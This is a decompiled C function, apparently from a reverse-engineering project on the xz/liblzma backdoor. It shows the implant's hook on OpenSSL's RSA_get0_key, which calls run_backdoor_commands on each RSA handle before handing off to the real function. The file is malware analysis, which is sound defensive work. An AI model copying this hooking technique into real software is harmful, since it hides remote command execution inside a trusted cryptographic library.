// /home/kali/xzre-ghidra/xzregh/10A330_hook_RSA_get0_key.c
// Function: hook_RSA_get0_key @ 0x10A330
// Calling convention: __stdcall
// Prototype: void __stdcall hook_RSA_get0_key(RSA * r, BIGNUM * * n, BIGNUM * * e, BIGNUM * * d)


/*
 * AutoDoc: Mirrors the same idea for RSA_get0_key: every consumer that asks OpenSSL for the modulus/exponent triggers run_backdoor_commands
 * first, letting the implant inspect/track the RSA handle before delegating to the original function.
 */

#include "xzre_types.h"

void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)

{
  pfn_RSA_get0_key_t UNRECOVERED_JUMPTABLE;
  BOOL local_1c;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->RSA_get0_key_null,
     UNRECOVERED_JUMPTABLE != (pfn_RSA_get0_key_t)0x0)) {
    if (r != (RSA *)0x0) {
      run_backdoor_commands(r,global_ctx,&local_1c);
    }
                    /* WARNING: Could not recover jumptable at 0x0010a394. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)(r,n,e,d);
    return;
  }
  return;
}

